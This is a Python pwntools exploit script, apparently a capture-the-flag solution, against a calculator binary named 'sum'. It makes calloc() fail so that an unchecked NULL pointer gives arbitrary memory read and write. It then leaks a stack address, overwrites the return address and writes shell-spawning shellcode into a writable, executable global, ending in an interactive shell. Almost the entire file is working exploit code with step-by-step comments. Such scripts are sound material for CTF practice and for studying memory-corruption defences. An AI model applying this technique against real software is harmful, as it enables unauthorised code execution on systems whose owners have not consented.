#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template sum
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('sum')
context.terminal = "terminator -x".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# Break at the beginning of main, and at the end of
# calculator() (before the epilogue)
gdbscript = '''
break *0x{exe.symbols.main:x}
break *0x00000000004014cc
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

def read_prompt():
    x = io.recvuntil("\n> ")
    print(x)

# Address of the 'author' global variable (fixed).
#   $ objdump -D ./sum | grep author
author_addr = 0x4040a0

# Prepare the shellcode string (payload), padding that to 8 bytes (with NOPS).
payload = asm(shellcraft.sh())
if len(payload) % 8 != 0:
    payload = '\x90'*(8 - (len(payload) % 8)) + payload

# Read the initial prompt.
read_prompt()

# Cause calloc() to fail by passing a huge value.
# The program does not check that calloc() does not return NULL.
io.sendline('-1')
read_prompt()
# Now we can read/write the whole process memory using get/set
# commands.

# Use a get command to read the value stored in the 'author' variable.
# This is a pointer to a calculator() local variable. It's an information
# leak that allows us to workaround ASLR.
read_index = author_addr/8
cmd = 'get %lu' % (read_index)
print(cmd)
io.sendline(cmd)
strval = io.recvline()
read_prompt()
name_addr_int64 = int(strval)
print("Leaked address is: %x" % name_addr_int64)
ptr_to_calculator_ret_addr = name_addr_int64 + 44

# Overwrite the return address. If the stack is executable we
# set the return address to point right below the location
# where the return address itself is stored.
#     values[write_index] = ptr_to_calculator_ret_addr+8
# Otherwise if the data segments are executable, we can use
# the address of the 'author' global variable, which is
# also fixed.
#     values[write_index] = author_addr
write_index = ptr_to_calculator_ret_addr/8
cmd = 'set %lu %ld' % (write_index, author_addr)
print(cmd)
io.sendline(cmd)

write_index = author_addr/8
# Now we can just write the shellocode starting from the new
# return address, using the same technique.
i = 0
while i < len(payload):
    # Unpack 8 bytes of the shellocode (string --> signed integer)
    payload_qword = u64(payload[i:i+8], sign="signed")
    cmd = 'set %lu %ld' % (write_index, payload_qword)
    print(cmd)
    io.sendline(cmd)
    write_index += 1
    i += 8
# Send 'bye' to stop the input loop, and let calculator() return.
io.sendline('bye')

# Switch to interactive mode to use the shell.
io.interactive()
